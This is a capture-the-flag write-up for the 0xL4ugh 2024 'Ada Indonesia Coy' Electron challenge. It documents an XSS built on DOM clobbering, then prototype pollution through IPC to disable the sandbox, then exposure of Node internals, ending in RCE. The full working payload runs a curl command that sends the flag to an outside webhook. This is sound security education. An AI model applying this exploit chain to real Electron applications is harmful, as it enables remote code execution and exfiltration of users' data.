---
title: "2024 0xL4ugh CTF - Ada Indonesia Coy 🇮🇩"
description: "A writeup for 2024 0xL4ugh CTF - Ada Indonesia Coy. An electron based app with XSS vunerabilty excalated to RCE"
pubDate: "2024-12-29"
tags: ["electron", "web"]
---

## The Problem

There are tons of files for this challenge, but our main focus would be these 2 files which defines the electron app.

[https://gist.github.com/nolangilardi/fc8b30441d669a985b471364bb3d07e6](https://gist.github.com/nolangilardi/fc8b30441d669a985b471364bb3d07e6)

Our `BroweserWindow` loaded with this config as nodeIntegration and contextIsolation set to false. This means that the renderer doesnt get access to node feature except for the preload script (nodeIntegration:false), but both the preload and electron internal shares the same Javascript context (contextIsolation:false).

The `BrowserWindow` is loaded with the following configuration:
```js
    webPreferences: {
      preload: path.join(__dirname, "./preload.js"),
      nodeIntegration: false,
      contextIsolation: false,
    },
```
With `nodeIntegration: false`, the renderer process doesn’t have direct access to Node.js features. Meanwhile, `contextIsolation: false` means the preload script and Electron internals share the same JavaScript context.

## Vulns

### XSS in renderer

The following function is designed to create an iframe for displaying notes:

```js
async function createNoteFrame(html, time) {
    const note = document.createElement("iframe")
    note.frameBorder = false
    note.height = "250px"
    note.srcdoc = "<dialog id='dialog'>" + html + "</dialog>"
    note.sandbox = 'allow-same-origin'
    note.onload = (ev) => {
        const dialog = new Proxy(ev.target.contentWindow.dialog, {
            get: (target, prop) => {
                const res = target[prop];
                return typeof res === "function" ? res.bind(target) : res;
            },
        })
        setInterval(dialog.close, time / 2);
        setInterval(dialog.showModal, time);
    }
    return note
}

...

const mynote = await createNoteFrame("<h1>Hati Hati!</h1><p>Website " + decodeURIComponent(document.location) + " Kemungkinan Berbahaya!</p>", 1000)
```

We can leverage DOM clobbering of `dialog.close` or `dialog.showModal` to execute arbitrary JavaScript code. This is one of the quirks of `setTimeout` and `setInterval`, where if we suply the first argument as string, it will try to create new Js Function and execute it. The payload would be like this

```html
<a id=dialog name=close href="foo:console.log(1337)">
```

### Prototype Pollution in config via IPC communication

```js
// main.js
ipcMain.handle("set-config", (_, conf, obj) => {
  Object.assign(config[conf], obj)
})

ipcMain.handle("get-config", (_) => {
  return config
})

ipcMain.handle("get-window", (_) => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    parent: mainWindow,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: false,
    },
    fullscreen: false,
  })
  win.loadFile("./ada-indonesia-coy/index.html")
})

// preload.js
class api {
    getConfig(){
        return electron.ipcRenderer.invoke("get-config")
    }
    setConfig(conf, obj){
        electron.ipcRenderer.invoke("set-config", conf, obj)
    }
    window(){
        electron.ipcRenderer.invoke("get-window")
    }
}

window.api = new api()
```

`preload.js` exposes the 3 custom ipcs to renderer. `set-config` ipc handler directly modifies config object using `Object.assign`. By setting `config.__proto__` to arbitrary value, this means we have prototype pollution.

This prototype pollution can be used to toggle on/off some default configuration where spawnin new `BrowserWindow` using the overriden value with prototype pollution, for example ticking off sandbox so that newly spawned BrowserWindow would have `--no-sandbox`. 


We can confirm this by running the below JS directly into dev console (open it with <kbd>Ctrl+Shift+I</kbd>) and then check the running process using `ps`.

```js
api.setConfig("__proto__", {sandbox:0})
api.window()
```

```
user       23110   23024  1 05:33 pts/4    00:00:00 /redacted/baby-electron
                     --type=renderer
                     --enable-crash-reporter=1055940f-328a-45d8-8bec-258737cfdddc,no_channel
                     --user-data-dir=/home/user/.config/baby-electron
                     --app-path=/redacted/resources/app.asar
                     --enable-sandbox
                     --disable-gpu-compositing
                     --lang=en-US
                     --num-raster-threads=3
                     --enable-main-frame-before-activation
                     --renderer-client-id=5
                     --time-ticks-at-unix-epoch=-1735446046824602
                     --launch-time-ticks=4336005364
                     --shared-files=v8_context_snapshot_data:100
                     --field-trial-handle=0,i,3045807141174497258,9035281799453053754,262144
                     --disable-features=SpareRendererForSitePerProcess
...
user       23245   23017  2 05:33 pts/4    00:00:00 /redacted/baby-electron
                     --type=renderer
                     --enable-crash-reporter=1055940f-328a-45d8-8bec-258737cfdddc,no_channel
                     --user-data-dir=/home/user/.config/baby-electron
                     --app-path=/redacted/resources/app.asar
                     --no-sandbox
                     --no-zygote
                     --disable-gpu-compositing
                     --lang=en-US
                     --num-raster-threads=3
                     --enable-main-frame-before-activation
                     --renderer-client-id=10
                     --time-ticks-at-unix-epoch=-1735446046824602
                     --launch-time-ticks=4359800639
                     --shared-files=v8_context_snapshot_data:100
                     --field-trial-handle=0,i,3045807141174497258,9035281799453053754,262144
                     --disable-features=SpareRendererForSitePerProcess
```

notice that there are 2 electron process, one with `--enable-sandbox` and the other one with `--no-sandbox`.

### Exposing node modules to renderer process

Since BrowserWindow started with contextIsolation set to false, we can expose it using polluting builtins objects (Js context shared with electron internals). This is explained better in the other author challenge writeup [2023 HITCON CTF - Harmony](https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Harmony).

This works because electron internally uses webpack and webpack require will do a lazy load. When electron internally does `__webpack_require__("./lib/renderer/api/ipc-renderer.ts")`, we will intercept it and copy `this` object from `t` and exposes it to our window renderer. This code explains better than words,

```js
window.copyOfIpcRenderer = null;
Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
  set(v) {
    window.copyOfIpcRenderer = v;
    window.module = this.module;
  },
  get() {
    return window.copyOfIpcRenderer;
  }
});
```

```js
function __webpack_require__(r) {
	var n = t[r];
	if (void 0 !== n)
		return n.exports;
	var i = t[r] = {
		exports: {}
	};
	return e[r](i, i.exports, __webpack_require__),
	i.exports
}
```

## Chaining it together

Since the javascript code will be executed on `setInterval`, we can clean this up to execute only one within sync guard if block

```js
if (!window.SyncOnce) {
  window.SyncOnce = true;
  ...
}
```

First, we will need to intercept the `__webpack_require__` function, due to electron lazyLoading ipcRenderer and we will need to intercept it before we do any ipc communication.

```js
if (!window.SyncOnce) {
  window.SyncOnce = true;
  
  window.copyOfIpcRenderer = null;
  Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
    set(v) {
      window.copyOfIpcRenderer = v;
      window.module = this.module;
    },
    get() {
      return window.copyOfIpcRenderer;
    }
  });
}
```

Secondly, we can start do some ipc communications. Using prototype pollution to disable sandbox and spawn new BrowserWindow,

```js
if (!window.SyncOnce) {
  window.SyncOnce = true;
  
  // snip

  api.setConfig(`__proto__`, {sandbox:false});
  api.window();
}
```

The new BrowserWindow will have same `document.location` as our first window, thus makes it executing the same xss payload. At this point we have exposed node modules to our renderer, so we just need to execute RCE payload

```js
if (window.module && !window.syncOnce2) {
  window.syncOnce2 = true;
  window.module.exports._load(`child_process`).execSync(`curl http://webhook -d flag=$(/readflag)`);
}
```

## Final Payload

```js
if (!window.syncOnce) {
  window.syncOnce = true;

  window.copyOfIpcRenderer = null;
  Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
    set(v) {
      window.copyOfIpcRenderer = v;
      window.module = this.module;
    },
    get() {
      return window.copyOfIpcRenderer;
    }
  });

  api.setConfig(`__proto__`, { sandbox: false });
  api.window();
}


if (window.module && !window.syncOnce2) {
  window.syncOnce2 = true;
  window.module.exports._load(`child_process`).execSync(`curl http://webhook -d flag=$(/readflag)`);
}
```

### Smuggling the Payload

Encode the payload in dom clobbering attack
```html
<a id=dialog name=close href="foo:PAYLOAD">
```

Use a meta-equiv tag to redirect and inject URL encoded DOM clobbering payload via the URL hash:

```html
<meta http-equiv="refresh" content="0; url=https://127.0.0.1:3000/#...">
```